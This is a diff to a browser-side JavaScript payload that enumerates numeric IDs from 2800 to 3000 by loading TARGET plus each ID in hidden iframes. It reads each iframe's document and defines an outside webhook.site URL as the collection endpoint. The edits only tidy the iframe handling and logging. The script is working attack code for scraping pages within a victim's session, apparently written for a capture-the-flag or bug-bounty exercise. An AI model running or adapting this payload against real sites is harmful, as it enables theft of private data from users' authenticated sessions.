@@ -4,6 +4,7 @@ const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 
 function tryId(start = 2800, max = 3000) {
     let i = start;
+
     function next() {
         if (i > max) return;
 
@@ -11,6 +12,7 @@ function tryId(start = 2800, max = 3000) {
         iframe.style.display = "none";
 
         const currentId = i;
+
         iframe.onload = () => {
             try {
                 const doc = iframe.contentDocument;
@@ -24,18 +26,22 @@ function tryId(start = 2800, max = 3000) {
                 console.log("error reading", currentId);
             }
 
-            document.body.removeChild(iframe);
-            console.log(i);
+            iframe.remove();
+
+            console.log(currentId);
             i++;
             setTimeout(next, 30);
         };
 
         iframe.src = TARGET + currentId;
-        document.body.appendChild(iframe);
+
+        const container = document.body || document.documentElement;
+        container.appendChild(iframe);
     }
 
     next();
 }
+
 
 tryId();
 </script>
